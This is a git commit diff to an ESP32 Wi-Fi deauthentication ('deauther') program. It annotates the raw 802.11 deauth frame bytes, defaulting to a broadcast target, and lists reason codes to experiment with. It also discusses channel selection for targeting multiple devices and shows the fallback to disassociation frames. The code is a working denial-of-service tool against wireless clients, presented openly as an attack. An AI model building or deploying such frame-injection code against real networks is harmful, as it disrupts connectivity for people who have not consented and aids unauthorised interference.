f0a1d17dcd273e92c745612416dbd2dcc92c1bb1
Eugenethiri <eugene.thirikali@strathmore.edu>
2025-02-10 10:37:11 +0300

    Update esp32Deuther.cpp
    dont hate me hate the game

--- esp32Deuther.cpp
+++ esp32Deuther.cpp
@@ -16,17 +16,29 @@
 typedef uint8_t MacAddr[6];
 
 const uint8_t deauthPacket[] = {
-    0xC0, 0x00, 0x3A, 0x01,  
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Target MAC (to be replaced)
+    0xC0, 0x00, 0x3A, 0x01,  //Type of frame & duration  (C0 FOR DEAUTH, A0 FOR DISSASSOCIATE)
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Target MAC (to be replaced), set to bradcast address as default
     0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // AP MAC (to be replaced)
     0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (to be replaced)
-    0x00, 0x00,  
-    0x01, 0x00  
+    0x00, 0x00,  //Sequence number
+    0x01, 0x00  //Reason  
 };
+/*
+Experiment with Different Reason Codes (in little-endian architecture):
+0x01 = Unspecified reason (most common)
+0x04 = Disassociated due to inactivity
+0x05 = Disassociated because AP is unable to handle all connected stations
+0x08 = Deauthenticated because sending station is leaving (or has left)
+*/
 
 uint8_t buffer[sizeof(deauthPacket)];
 uint16_t seqnum = 0;  
 
+/*Handling the channel to send the frames in  ***mmh something smells fishhy about the change_channel function with the esp_err_t*** 
+i like how its efficient by not just sending frames in all the 13 channels, but by listening to the active one
+here comes in the issue of channel hopping especially when targeting multiple devices
+currently the non overlapping ones are 1,6 and 11 but ill need to test while documenting if others in between do overlap
+*/
 esp_err_t change_channel(uint8_t channel) {
     return esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 }
@@ -53,7 +65,7 @@ esp_err_t deauth(const MacAddr target, const MacAddr ap, const MacAddr bssid, ui
     res = raw(buffer, sizeof(deauthPacket));
     if (res == ESP_OK) return ESP_OK;
 
-    buffer[0] = 0xA0;
+    buffer[0] = 0xA0; // Yah guessed it switch to dissassociate
     return raw(buffer, sizeof(deauthPacket));
 }
 
